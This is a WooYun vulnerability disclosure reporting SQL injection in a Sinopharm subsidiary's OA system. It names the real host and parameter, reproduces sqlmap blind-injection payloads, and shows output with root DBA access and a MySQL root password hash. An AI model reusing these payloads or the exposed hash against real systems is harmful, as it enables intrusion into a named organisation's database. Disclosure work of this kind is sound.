wybug_title: 国药集团西北某公司SQL注入
wybug_detail:
漏洞详情 披露状态：   									2015-12-26：	细节已通知厂商并且等待厂商处理中									2015-12-28：	厂商已经确认，细节仅向厂商公开									2016-01-07：	细节向核心白帽子及相关领域专家公开									2016-01-17：	细节向普通白帽子公开									2016-01-27：	细节向实习白帽子公开									2016-02-09：	细节向公众公开  简要描述：  详细说明：  国药陕西OA系统SQL注入注入点：gksx.free.ezvpn.cn:8080/yyoa/checkWaitdo.jsp?userID=1
sqlmap identified the following injection point(s) with a total of 44 HTTP(s) requests:---Parameter: userID (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: userID=1%' AND 6888=6888 AND '%'='    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: userID=1%' AND (SELECT * FROM (SELECT(SLEEP(5)))AhnL) AND '%'='---web application technology: JSPback-end DBMS: MySQL 5.0.12sqlmap resumed the following injection point(s) from stored session:---Parameter: userID (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: userID=1%' AND 6888=6888 AND '%'='    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: userID=1%' AND (SELECT * FROM (SELECT(SLEEP(5)))AhnL) AND '%'='---web application technology: JSPback-end DBMS: MySQL 5.0.12current user:    'root@localhost'current database:    'mysql3235'current user is DBA:    Truedatabase management system users password hashes:[*] root [1]:    password hash: *1532B21FE550E115F113DAA9A26D0EEEEF8DEDC7
DBA权限，数据库用户密码。   漏洞证明：     修复方案：     版权声明：转载请注明来源 路人甲@乌云
